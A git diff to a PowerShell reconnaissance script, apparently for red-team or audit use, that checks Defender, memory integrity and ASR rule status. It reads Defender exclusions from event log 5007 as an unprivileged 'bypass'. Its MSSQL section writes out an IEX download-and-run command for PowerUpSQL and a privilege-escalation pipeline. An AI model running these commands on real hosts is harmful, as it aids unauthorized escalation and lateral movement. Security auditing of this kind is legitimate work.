@@ -142,22 +142,6 @@ try {
     Write-Host "       - Microsoft Defender for Endpoint Network Protection can not be queried" -ForegroundColor DarkYellow
 }
 
-# Memory Integrity
-try {
-    if (Test-Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity") {
-        $hvciStatus = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity").Enabled
-        if ($hvciStatus -eq 1) {
-            Write-Host "       - Memory Integrity is enabled" -ForegroundColor Green
-        } else {
-            Write-Host "       - Memory Integrity is disabled" -ForegroundColor DarkRed
-        }
-    } else {
-        Write-Host "       - Memory Integrity requires more permissions to view" -ForegroundColor DarkGray
-    }
-} catch {
-    Write-Host "       - Memory Integrity is unknown" -ForegroundColor DarkYellow
-}
-
 # Tamper Protection
 $TamperProtectionStatus = $DefenderStatus.IsTamperProtected
 $TamperProtectionManage = $DefenderStatus.TamperProtectionSource
@@ -175,6 +159,21 @@ if (-not $DefenderPreferences.DisableBehaviorMonitoring) {
     Write-Host "       - Behavior Monitoring is disabled" -ForegroundColor DarkRed
 }
 
+# Memory Integrity
+try {
+    if (Test-Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity") {
+        $hvciStatus = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity").Enabled
+        if ($hvciStatus -eq 1) {
+            Write-Host "       - Memory Integrity is enabled" -ForegroundColor Green
+        } else {
+            Write-Host "       - Memory Integrity is disabled" -ForegroundColor DarkRed
+        }
+    } else {
+        Write-Host "       - Memory Integrity requires more permissions to view" -ForegroundColor DarkGray
+    }
+} catch {
+    Write-Host "       - Memory Integrity is unknown" -ForegroundColor DarkYellow
+}
 
 # Exclusions
 if ($isAdmin) {
@@ -200,8 +199,81 @@ if ($isAdmin) {
     } else {
         Write-Host "[OK]   No exclusions found" -ForegroundColor Green
     }
+
+# Exclusions through event ID    
 } else {
-    Write-Host "       - Exclusions require more permissions to view" -ForegroundColor DarkGray
+    $LogName = "Microsoft-Windows-Windows Defender/Operational"
+    $EventID = 5007
+    $foundExclusions = @()
+    try {
+        $ExclusionEvents = Get-WinEvent -LogName $LogName -ErrorAction SilentlyContinue | Where-Object { $_.Id -eq $EventID -and $_.Message -match "Exclusions" } | Select-Object -First 10
+        foreach ($Event in $ExclusionEvents) {
+            if ($Event.Message -match "\\Exclusions\\Paths\\") {
+                $foundExclusions += $Event.Message
+            }
+        }
+        if ($foundExclusions.Count -gt 0) {
+            Write-Host "[KO]   Exclusions detected via event logs" -ForegroundColor DarkRed
+            foreach ($path in $foundExclusions) {
+                Write-Host "       - $path" -ForegroundColor DarkGray
+            }
+        } else {
+            Write-Host "       - Exclusions require more privs. Attempted bypass (eventlog 5007) but none were found" -ForegroundColor DarkGray
+        }
+    } catch {
+        Write-Host "       - Exclusions require more privs. Attempted bypass (eventlog 5007) but none were found" -ForegroundColor DarkGray
+    }
+}
+
+
+# ASR Rules
+$asrRulesDefinitions = @{
+    "BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550" = "Block executable content from email client and webmail"
+    "D4F940AB-401B-4EFC-AADC-AD5F3C50688A" = "Block all Office applications from creating child processes"
+    "3B576869-A4EC-4529-8536-B80A7769E899" = "Block Office applications from creating executable content"
+    "75668C1F-73B5-4CF0-BB93-3ECF5CB7CC84" = "Block Office apps from injecting code into processes"
+    "D3E037E1-3EB8-44C8-A917-57927947596D" = "Block JS or VBS from launching downloaded executable content"
+    "5BEB7EFE-FD9A-4556-801D-275E5FFC04CC" = "Block execution of potentially obfuscated scripts"
+    "92E97FA1-2EDF-4476-BDD6-9DD0B4DDDC7B" = "Block Win32 API calls from Office macros"
+    "01443614-CD74-433A-B99E-2ECDC07BFC25" = "Block executable files unless prevalence or age criteria met"
+    "C1DB55AB-C21A-4637-BB3F-A12568109D35" = "Use advanced protection against ransomware"
+    "9E6C4E1F-7D60-472F-BA1A-A39EF669E4B2" = "Block credential stealing from lsass.exe"
+    "D1E49AAC-8F56-4280-B9BA-993A6D77406C" = "Block process creations from PSExec and WMI commands"
+    "B2B3F03D-6A65-4F7B-A9C7-1C7EF74A9BA4" = "Block untrusted and unsigned processes from USB"
+    "26190899-1602-49E8-8B27-EB1D0A1CE869" = "Block Office communication application from creating child processes"
+    "7674BA52-37EB-4A4F-A9A1-F0F9A1619A2C" = "Block Adobe Reader from creating child processes"
+    "E6DB77E5-3DF2-4CF1-B95A-636979351E5B" = "Block persistence through WMI event subscription"
+    "56A863A9-875E-4185-98A7-B882C64B5CE5" = "Block abuse of exploited vulnerable signed drivers"
+    "33DDEDF1-C6E0-47CB-833E-DE6133960387" = "Block rebooting machine in Safe Mode"
+    "C0033C00-D16D-4114-A5A0-DC9B3A7D2CEB" = "Block use of copied or impersonated system tools"
+    "A8F5898E-1DC8-49A9-9878-85004B8A61E6" = "Block Webshell creation for Servers"
+}
+if (IsAdmin) {
+    $asrStatuses = Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Actions
+    $asrRuleGuids = Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Ids
+    $disabledCount = 0
+    foreach ($guid in $asrRuleGuids) {
+        $index = [array]::IndexOf($asrRuleGuids, $guid)
+        if ($asrStatuses[$index] -ne 1) {
+            $disabledCount++
+        }
+    }
+    if ($disabledCount -gt 0) {
+        Write-Host "       - some $disabledCount ASR rule(s) not enabled" -ForegroundColor DarkRed
+        foreach ($guid in $asrRuleGuids) {
+            $index = [array]::IndexOf($asrRuleGuids, $guid)
+            if ($asrStatuses[$index] -ne 1) {
+                $ruleName = $asrRulesDefinitions[$guid]
+                if ($ruleName) {
+                    Write-Host "       - $ruleName" -ForegroundColor DarkGray
+                }
+            }
+        }
+    } else {
+        Write-Host "       - all ASR rules are enabled" -ForegroundColor Green
+    }
+} else {
+    Write-Host "       - ASR rule enumeration requires more privs" -ForegroundColor DarkGray
 }
 
 Write-Host ""
@@ -310,6 +382,57 @@ try {
     }
 } catch {
     Write-Host "[OK]   No System Center (SCCM/SCOM) infrastructure detected" -ForegroundColor Green
+}
+
+
+# MSSQL Enumeration
+$instances = @()
+try {
+    if (Test-Path "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\SQL") {
+        $regProps = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\SQL"
+        foreach ($prop in $regProps.PSObject.Properties) {
+            if ($prop.Name -notmatch "PS|Item|Drive|Path") {
+                $instances += $prop.Value
+            }
+        }
+    }
+} catch { }
+try {
+    $wmiInstances = Get-WmiObject -Class Win32_Service | Where-Object { $_.Name -like "MSSQL*" } | Select-Object -ExpandProperty Name
+    $instances += $wmiInstances
+} catch { }
+$instances = $instances | Sort-Object -Unique
+if ($instances) {
+    $mssqlLog = "$OUT\mssql_enum.txt"
+    "[KO]   MSSQL Instances Found:`n$($instances -join "`n")" | Add-Content $mssqlLog
+    "`nPowerUpSQL Enumeration:`nIEX (iwr 'https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1').Content" | Add-Content $mssqlLog
+    "Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | Where-Object {`$_.Status -eq 'Accessible'} | Get-SQLServerPrivEscRowThreated" | Add-Content $mssqlLog
+    "`nExploit References:`n- PowerUpSQL: https://github.com/NetSPI/PowerUpSQL`n- xp_cmdshell abuse, impersonation, linked servers" | Add-Content $mssqlLog
+    foreach ($instance in $instances) {
+        $regPath = "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\$instance\MSSQLServer"
+        try {
+            $service = Get-WmiObject -Class Win32_Service | Where-Object { $_.Name -eq $instance }
+            if ($service) {
+                "`nInstance: $instance`nService Account: $($service.StartName)`nState: $($service.State)" | Add-Content $mssqlLog
+                if ($service.StartName -match "SYSTEM|LocalService|NetworkService") {
+                    "[!] CRITICAL: Service runs as $($service.StartName)" | Add-Content $mssqlLog
+                }
+            }
+        } catch { }
+        try {
+            $port = (Get-ItemProperty -Path "$regPath\Tcp\IPAll" -Name "TcpPort" -ErrorAction SilentlyContinue).TcpPort
+            if ($port) { "TCP Port: $port" | Add-Content $mssqlLog }
+        } catch { }
+        try {
+            if ((Get-ItemProperty -Path "$regPath\SuperSocketNetLib\Np" -Name "Enabled" -ErrorAction SilentlyContinue).Enabled -eq 1) {
+                "[!] Named Pipes enabled (lateral movement vector)" | Add-Content $mssqlLog
+            }
+        } catch { }
+    }
+    Write-Host "[KO]   MSSQL instances detected -> mssql_enum.txt" -ForegroundColor DarkRed
+    Write-Host "       - PowerUpSQL: https://github.com/NetSPI/PowerUpSQL" -ForegroundColor DarkGray
+} else {
+    Write-Host "[OK]   No MSSQL instances detected" -ForegroundColor Green
 }
 
 Write-Host ""
